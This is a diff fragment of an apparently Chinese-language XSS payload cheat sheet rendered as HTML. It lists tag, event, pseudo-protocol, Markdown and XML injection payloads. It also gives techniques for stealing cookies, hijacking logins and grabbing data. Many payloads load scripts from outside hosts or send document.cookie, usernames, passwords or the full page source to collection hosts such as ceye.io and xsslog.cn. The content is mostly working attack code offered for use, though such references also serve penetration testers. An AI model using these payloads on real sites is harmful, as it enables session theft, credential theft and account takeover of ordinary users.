-<h4 id="&#x57FA;&#x4E8E;&#x6807;&#x7B7E;"><a name="&#x57FA;&#x4E8E;&#x6807;&#x7B7E;" class="anchor-navigation-ex-anchor" href="#&#x57FA;&#x4E8E;&#x6807;&#x7B7E;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x57FA;&#x4E8E;&#x6807;&#x7B7E;" class="anchor-navigation-ex-anchor" href="#&#x57FA;&#x4E8E;&#x6807;&#x7B7E;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x57FA;&#x4E8E;&#x6807;&#x7B7E;</h4>
+</code></pre><h3 id="&#x5E38;&#x7528;&#x57FA;&#x7840;payload">&#x5E38;&#x7528;&#x57FA;&#x7840;payload</h3>
+<h4 id="&#x57FA;&#x4E8E;&#x6807;&#x7B7E;">&#x57FA;&#x4E8E;&#x6807;&#x7B7E;</h4>
 <pre class="language-"><code class="lang-html">&lt;--`&lt;img/src=` onerror=confirm``&gt; --!&gt;
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Details</span> <span class="token attr-name">Open</span> <span class="token attr-name">OnToggle</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span>co\u006efirm`XSS`</span><span class="token punctuation">&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SCRIPT</span> <span class="token attr-name">SRC</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>http://damit5.kiwi/xss.js</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SCRIPT</span><span class="token punctuation">&gt;</span></span>
@@ -5080,7 +5000,7 @@
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>embed</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>image/svg+xml<span class="token punctuation">&quot;</span></span> <span class="token attr-name">AllowScriptAccess</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>always<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>embed</span><span class="token punctuation">&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>embed</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>embed</span><span class="token punctuation">&gt;</span></span>
 </code></pre>
-<h4 id="&#x57FA;&#x4E8E;&#x4E8B;&#x4EF6;"><a name="&#x57FA;&#x4E8E;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x57FA;&#x4E8E;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x57FA;&#x4E8E;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x57FA;&#x4E8E;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x57FA;&#x4E8E;&#x4E8B;&#x4EF6;</h4>
+<h4 id="&#x57FA;&#x4E8E;&#x4E8B;&#x4EF6;">&#x57FA;&#x4E8E;&#x4E8B;&#x4EF6;</h4>
 <p>&#x4E0A;&#x9762;&#x57FA;&#x4E8E;&#x6807;&#x7B7E;&#x4E2D;&#x4E5F;&#x6709;&#x5F88;&#x591A;&#x57FA;&#x4E8E;&#x4E8B;&#x4EF6;&#x7684;&#x4E86;&#xFF0C;&#x9047;&#x5230;&#x53EF;&#x4EE5;&#x7528;&#x4E8B;&#x4EF6;&#x7684;&#x4E5F;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x4E0B;&#x4E0A;&#x9762;&#x7684;&#x4E8B;&#x4EF6;</p>
 <pre class="language-"><code class="lang-javascript">onclick<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span>
 self<span class="token punctuation">[</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&quot;foo&quot;</span><span class="token punctuation">)</span> <span class="token comment">// alert(&quot;foo&quot;)</span>
@@ -5104,12 +5024,12 @@ self<span class="token punctuation">[</span><span class="token number">935025203
 <li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Events" target="_blank">https://developer.mozilla.org/zh-CN/docs/Web/Events</a></li>
 <li><a href="https://www.w3schools.cn/jsref/dom_obj_event.asp" target="_blank">https://www.w3schools.cn/jsref/dom_obj_event.asp</a></li>
 </ul>
-<h4 id="&#x57FA;&#x4E8E;&#x4F2A;&#x534F;&#x8BAE;"><a name="&#x57FA;&#x4E8E;&#x4F2A;&#x534F;&#x8BAE;" class="anchor-navigation-ex-anchor" href="#&#x57FA;&#x4E8E;&#x4F2A;&#x534F;&#x8BAE;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x57FA;&#x4E8E;&#x4F2A;&#x534F;&#x8BAE;" class="anchor-navigation-ex-anchor" href="#&#x57FA;&#x4E8E;&#x4F2A;&#x534F;&#x8BAE;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x57FA;&#x4E8E;&#x4F2A;&#x534F;&#x8BAE;</h4>
+<h4 id="&#x57FA;&#x4E8E;&#x4F2A;&#x534F;&#x8BAE;">&#x57FA;&#x4E8E;&#x4F2A;&#x534F;&#x8BAE;</h4>
 <p>&#x5982;&#x679C;URL&#x8DF3;&#x8F6C;&#x7684;&#x5730;&#x5740;&#x53EF;&#x63A7;&#xFF0C;&#x4E14;&#x5B58;&#x5728;&#x4E8E;<code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">&gt;</span></span></code>&#x6807;&#x7B7E;&#x4E2D;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x4F2A;&#x534F;&#x8BAE;&#x6765;XSS</p>
 <pre class="language-"><code class="lang-javascript">javascript<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token operator">%</span><span class="token constant">E2</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token function">A8alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
 javascript<span class="token operator">:</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">&apos;http://127.0.0.1:8999/username=&apos;</span><span class="token operator">+</span>document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">&apos;username&apos;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_value<span class="token operator">+</span><span class="token string">&apos;&amp;password=&apos;</span><span class="token operator">+</span>document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">&apos;password&apos;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_value
 </code></pre>
-<h4 id="markdown-xss"><a name="markdown-xss" class="anchor-navigation-ex-anchor" href="#markdown-xss"><i class="fa fa-link" aria-hidden="true"></i></a><a name="markdown-xss" class="anchor-navigation-ex-anchor" href="#markdown-xss"><i class="fa fa-link" aria-hidden="true"></i></a>MarkDown XSS</h4>
+<h4 id="markdown-xss">MarkDown XSS</h4>
 <p>&#x5217;&#x4E3E;&#x51E0;&#x4E2A;&#xFF0C;&#x53EF;&#x4EE5;&#x9700;&#x8981;&#x7684;&#x65F6;&#x5019;github&#x518D;&#x53BB;&#x627E;</p>
 <pre class="language-"><code class="lang-markdown"><span class="token url">[<span class="token content">a</span>](<span class="token url">javascript:prompt(document.cookie</span>)</span>)
 [a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
@@ -5120,11 +5040,11 @@ javascript<span class="token operator">:</span>location<span class="token punctu
 <span class="token url"><span class="token operator">!</span>[<span class="token content">a</span>](<span class="token url">data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=</span>)</span>
 ...
 </code></pre>
-<h4 id="xml-xss"><a name="xml-xss" class="anchor-navigation-ex-anchor" href="#xml-xss"><i class="fa fa-link" aria-hidden="true"></i></a><a name="xml-xss" class="anchor-navigation-ex-anchor" href="#xml-xss"><i class="fa fa-link" aria-hidden="true"></i></a>XML XSS</h4>
+<h4 id="xml-xss">XML XSS</h4>
 <pre class="language-"><code class="lang-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">x:</span>script</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.w3.org/1999/xhtml<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>alert(1)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">x:</span>script</span><span class="token punctuation">&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">x:</span>script</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.w3.org/1999/xhtml<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>//brutelogic.com.br/1.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
 </code></pre>
-<h3 id="&#x83B7;&#x53D6;cookie&#x624B;&#x6CD5;"><a name="&#x83B7;&#x53D6;cookie&#x624B;&#x6CD5;" class="anchor-navigation-ex-anchor" href="#&#x83B7;&#x53D6;cookie&#x624B;&#x6CD5;"><i class="fa fa-link" aria-hidden="true"></i></a>1.6.4. &#x83B7;&#x53D6;Cookie&#x624B;&#x6CD5;</h3>
+<h3 id="&#x83B7;&#x53D6;cookie&#x624B;&#x6CD5;">&#x83B7;&#x53D6;Cookie&#x624B;&#x6CD5;</h3>
 <pre class="language-"><code class="lang-html">&lt;img src=x onerror=with(document)body.appendChild(document.createElement(&apos;script&apos;)).src=&quot;js&#x5730;&#x5740;&quot;&gt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>img</span><span class="token punctuation">&gt;</span></span>
 &lt;img src=x onerror=eval(atob(&apos;cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8vNjYuMTEyLjIxMy43Njo4MS9CbHVlTG90dXNfWFNTUmVjZWl2ZXIvdGVtcGxhdGUvZGVmYXVsdC5qcyc=&apos;))&gt;
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>x<span class="token punctuation">&quot;</span></span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>$.getScript(<span class="token punctuation">&apos;</span>http://x.xsslog.cn/xxxxx<span class="token punctuation">&apos;</span>)<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span> <span class="token comment">&lt;!-- &#x9700;&#x8981; jquery &#x7684;&#x652F;&#x6301; --&gt;</span>
@@ -5136,10 +5056,10 @@ javascript<span class="token operator">:</span>location<span class="token punctu
 &lt;img/src/onerror=s.src=&apos;https://vxss.cc/r7K6&apos;&gt;
 &lt;svg/onload=&quot;document.location=&apos;http://72sf9a.ceye.io/?&apos;+document.cookie&quot;&gt;
 </code></pre>
-<h3 id="&#x767B;&#x9646;&#x52AB;&#x6301;&#x624B;&#x6CD5;"><a name="&#x767B;&#x9646;&#x52AB;&#x6301;&#x624B;&#x6CD5;" class="anchor-navigation-ex-anchor" href="#&#x767B;&#x9646;&#x52AB;&#x6301;&#x624B;&#x6CD5;"><i class="fa fa-link" aria-hidden="true"></i></a>1.6.5. &#x767B;&#x9646;&#x52AB;&#x6301;&#x624B;&#x6CD5;</h3>
+<h3 id="&#x767B;&#x9646;&#x52AB;&#x6301;&#x624B;&#x6CD5;">&#x767B;&#x9646;&#x52AB;&#x6301;&#x624B;&#x6CD5;</h3>
 <p>&#x5982;&#x679C;&#x9047;&#x5230;&#x767B;&#x5F55;&#x9875;&#x9762;&#x5B58;&#x5728;XSS&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E00;&#x4E9B;&#x7279;&#x6B8A;&#x7684;js&#x4EE3;&#x7801;&#x6765;&#x83B7;&#x53D6;&#x8D26;&#x53F7;&#x5BC6;&#x7801;&#x7B49;&#xFF0C;&#x8FBE;&#x5230;&#x767B;&#x9646;&#x52AB;&#x6301;&#x7684;&#x76EE;&#x7684;</p>
 <p>&#x4E3E;&#x4E00;&#x4E9B;&#x4F8B;&#x5B50;&#xFF0C;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#x4FEE;&#x6539;</p>
-<h4 id="&#x8F93;&#x5165;&#x5C31;&#x5F39;&#x7A97;"><a name="&#x8F93;&#x5165;&#x5C31;&#x5F39;&#x7A97;" class="anchor-navigation-ex-anchor" href="#&#x8F93;&#x5165;&#x5C31;&#x5F39;&#x7A97;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x8F93;&#x5165;&#x5C31;&#x5F39;&#x7A97;" class="anchor-navigation-ex-anchor" href="#&#x8F93;&#x5165;&#x5C31;&#x5F39;&#x7A97;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x8F93;&#x5165;&#x5C31;&#x5F39;&#x7A97;</h4>
+<h4 id="&#x8F93;&#x5165;&#x5C31;&#x5F39;&#x7A97;">&#x8F93;&#x5165;&#x5C31;&#x5F39;&#x7A97;</h4>
 <pre class="language-"><code class="lang-html"><span class="token comment">&lt;!-- &#x8F93;&#x5165;&#x5C31;&#x5F39;&#x7A97;&#xFF0C;&#x521D;&#x59CB;&#x4EE3;&#x7801; --&gt;</span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>ccc<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>1<span class="token punctuation">&quot;</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>20<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span>
@@ -5153,7 +5073,7 @@ javascript<span class="token operator">:</span>location<span class="token punctu
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>ccc<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xxx<span class="token punctuation">&quot;</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>20<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>
 &lt;svg/onload=&quot;var input = document.getElementById(&apos;xxx&apos;);input.oninput = function(){alert(input.value);}&quot;&gt;
 </code></pre>
-<h4 id="&#x4FEE;&#x6539;&#x8868;&#x5355;&#x7684;action"><a name="&#x4FEE;&#x6539;&#x8868;&#x5355;&#x7684;action" class="anchor-navigation-ex-anchor" href="#&#x4FEE;&#x6539;&#x8868;&#x5355;&#x7684;action"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x4FEE;&#x6539;&#x8868;&#x5355;&#x7684;action" class="anchor-navigation-ex-anchor" href="#&#x4FEE;&#x6539;&#x8868;&#x5355;&#x7684;action"><i class="fa fa-link" aria-hidden="true"></i></a>&#x4FEE;&#x6539;&#x8868;&#x5355;&#x7684;action</h4>
+<h4 id="&#x4FEE;&#x6539;&#x8868;&#x5355;&#x7684;action">&#x4FEE;&#x6539;&#x8868;&#x5355;&#x7684;action</h4>
 <pre class="language-"><code class="lang-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xxx.php<span class="token punctuation">&quot;</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>sss<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xxx<span class="token punctuation">&quot;</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xxx<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
@@ -5163,15 +5083,15 @@ javascript<span class="token operator">:</span>location<span class="token punctu
 <span class="token comment">&lt;!-- &#x6CA1;&#x6709;id &#x6CA1;&#x6709; name &#x53EF;&#x4EE5;&#x901A;&#x8FC7; getElementsByTagName &#x6765;&#x4FEE;&#x6539; --&gt;</span>
 &lt;svg/onload=&quot;var form1 = document.getElementsByTagName(&apos;form&apos;)[0];form1.action = &apos;http://127.0.0.1/out.php&apos;;&quot;&gt;
 </code></pre>
-<h4 id="&#x901A;&#x8FC7;&#x589E;&#x52A0;&#x6309;&#x94AE;&#x5C5E;&#x6027;"><a name="&#x901A;&#x8FC7;&#x589E;&#x52A0;&#x6309;&#x94AE;&#x5C5E;&#x6027;" class="anchor-navigation-ex-anchor" href="#&#x901A;&#x8FC7;&#x589E;&#x52A0;&#x6309;&#x94AE;&#x5C5E;&#x6027;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x901A;&#x8FC7;&#x589E;&#x52A0;&#x6309;&#x94AE;&#x5C5E;&#x6027;" class="anchor-navigation-ex-anchor" href="#&#x901A;&#x8FC7;&#x589E;&#x52A0;&#x6309;&#x94AE;&#x5C5E;&#x6027;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x901A;&#x8FC7;&#x589E;&#x52A0;&#x6309;&#x94AE;&#x5C5E;&#x6027;</h4>
+<h4 id="&#x901A;&#x8FC7;&#x589E;&#x52A0;&#x6309;&#x94AE;&#x5C5E;&#x6027;">&#x901A;&#x8FC7;&#x589E;&#x52A0;&#x6309;&#x94AE;&#x5C5E;&#x6027;</h4>
 <pre class="language-"><code class="lang-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">&quot;.news[type=submit]&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">&quot;onclick&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;alert(&quot;</span>Password<span class="token operator">:</span><span class="token string">&quot; + document.getElementsByName(&apos;Password&apos;)[0].value)&quot;</span><span class="token punctuation">)</span>
 </code></pre>
-<h4 id="&#x8DF3;&#x8F6C;&#x7684;&#x767B;&#x9646;&#x52AB;&#x6301;"><a name="&#x8DF3;&#x8F6C;&#x7684;&#x767B;&#x9646;&#x52AB;&#x6301;" class="anchor-navigation-ex-anchor" href="#&#x8DF3;&#x8F6C;&#x7684;&#x767B;&#x9646;&#x52AB;&#x6301;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x8DF3;&#x8F6C;&#x7684;&#x767B;&#x9646;&#x52AB;&#x6301;" class="anchor-navigation-ex-anchor" href="#&#x8DF3;&#x8F6C;&#x7684;&#x767B;&#x9646;&#x52AB;&#x6301;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x8DF3;&#x8F6C;&#x7684;&#x767B;&#x9646;&#x52AB;&#x6301;</h4>
+<h4 id="&#x8DF3;&#x8F6C;&#x7684;&#x767B;&#x9646;&#x52AB;&#x6301;">&#x8DF3;&#x8F6C;&#x7684;&#x767B;&#x9646;&#x52AB;&#x6301;</h4>
 <p>&#x5982;&#x679C;&#x8DF3;&#x8F6C;&#x7684;&#x94FE;&#x63A5;&#x53EF;&#x63A7;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x52AB;&#x6301;&#x5230;&#x6570;&#x636E;</p>
 <pre class="language-"><code class="lang-javascript">redirectUrl<span class="token operator">=</span>javascript<span class="token operator">:</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">&apos;http://127.0.0.1:8999/username=&apos;</span><span class="token operator">+</span>document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">&apos;username&apos;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_value<span class="token operator">+</span><span class="token string">&apos;&amp;password=&apos;</span><span class="token operator">+</span>document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">&apos;password&apos;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_value
 </code></pre>
-<h3 id="&#x83B7;&#x53D6;&#x654F;&#x611F;&#x6570;&#x636E;"><a name="&#x83B7;&#x53D6;&#x654F;&#x611F;&#x6570;&#x636E;" class="anchor-navigation-ex-anchor" href="#&#x83B7;&#x53D6;&#x654F;&#x611F;&#x6570;&#x636E;"><i class="fa fa-link" aria-hidden="true"></i></a>1.6.6. &#x83B7;&#x53D6;&#x654F;&#x611F;&#x6570;&#x636E;</h3>
-<h4 id="&#x53D1;&#x9001;xhr&#x8BF7;&#x6C42;&#x83B7;&#x53D6;&#x6570;&#x636E;"><a name="&#x53D1;&#x9001;xhr&#x8BF7;&#x6C42;&#x83B7;&#x53D6;&#x6570;&#x636E;" class="anchor-navigation-ex-anchor" href="#&#x53D1;&#x9001;xhr&#x8BF7;&#x6C42;&#x83B7;&#x53D6;&#x6570;&#x636E;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x53D1;&#x9001;xhr&#x8BF7;&#x6C42;&#x83B7;&#x53D6;&#x6570;&#x636E;" class="anchor-navigation-ex-anchor" href="#&#x53D1;&#x9001;xhr&#x8BF7;&#x6C42;&#x83B7;&#x53D6;&#x6570;&#x636E;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x53D1;&#x9001;xhr&#x8BF7;&#x6C42;&#x83B7;&#x53D6;&#x6570;&#x636E;</h4>
+<h3 id="&#x83B7;&#x53D6;&#x654F;&#x611F;&#x6570;&#x636E;">&#x83B7;&#x53D6;&#x654F;&#x611F;&#x6570;&#x636E;</h3>
+<h4 id="&#x53D1;&#x9001;xhr&#x8BF7;&#x6C42;&#x83B7;&#x53D6;&#x6570;&#x636E;">&#x53D1;&#x9001;xhr&#x8BF7;&#x6C42;&#x83B7;&#x53D6;&#x6570;&#x636E;</h4>
 <p>&#x901A;&#x8FC7;xhr&#x6765;&#x83B7;&#x53D6;&#x654F;&#x611F;&#x6570;&#x636E;&#xFF0C;&#x6709;jquery&#x66F4;&#x7B80;&#x5355;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;xhr&#x6BD4;&#x8F83;&#x901A;&#x7528;</p>
 <pre class="language-"><code class="lang-html"># &#x7EAF;js&#x8BF7;&#x6C42;&#x83B7;&#x53D6;token -&gt; &#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span>
@@ -5188,7 +5108,7 @@ javascript<span class="token operator">:</span>location<span class="token punctu
     }
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
 </code></pre>
-<h4 id="&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x9875;&#x9762;&#x6E90;&#x7801;"><a name="&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x9875;&#x9762;&#x6E90;&#x7801;" class="anchor-navigation-ex-anchor" href="#&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x9875;&#x9762;&#x6E90;&#x7801;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x9875;&#x9762;&#x6E90;&#x7801;" class="anchor-navigation-ex-anchor" href="#&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x9875;&#x9762;&#x6E90;&#x7801;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x9875;&#x9762;&#x6E90;&#x7801;</h4>
+<h4 id="&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x9875;&#x9762;&#x6E90;&#x7801;">&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x9875;&#x9762;&#x6E90;&#x7801;</h4>
 <pre class="language-"><code class="lang-javascript"><span class="token keyword">var</span> xmlhttp<span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>XMLHttpRequest<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// code for IE7+, Firefox, Chrome, Opera, Safari</span>
     xmlhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -5199,8 +5119,8 @@ javascript<span class="token operator">:</span>location<span class="token punctu
 xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;POST&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;http://dnslog.ceye.io/html_source&quot;</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">escape</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>location<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;=&quot;</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">&apos;html&apos;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 </code></pre>
-<h3 id="&#x7ED5;&#x8FC7;"><a name="&#x7ED5;&#x8FC7;" class="anchor-navigation-ex-anchor" href="#&#x7ED5;&#x8FC7;"><i class="fa fa-link" aria-hidden="true"></i></a>1.6.7. &#x7ED5;&#x8FC7;</h3>
